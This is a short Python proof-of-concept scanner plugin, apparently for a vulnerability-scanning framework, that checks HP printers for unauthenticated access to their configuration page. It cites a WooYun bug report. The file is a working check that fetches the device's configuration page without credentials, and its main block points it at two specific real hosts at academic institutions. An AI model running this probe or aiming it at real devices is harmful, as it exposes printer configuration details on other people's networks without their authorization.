#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : HP多款打印机 未授权访问
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0103446


"""
import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    
    payload="hp/device/InternalPages/Index?id=ConfigurationPage"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if code ==200 and 'HomeDeviceName' in res and 'HomeDeviceIp' in res:
        security_hole(target)
   
    

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://ipmtf66.topo.polimi.it/')[1])
    audit(assign('www', 'http://micro-162-213.ensp.fiocruz.br/')[1])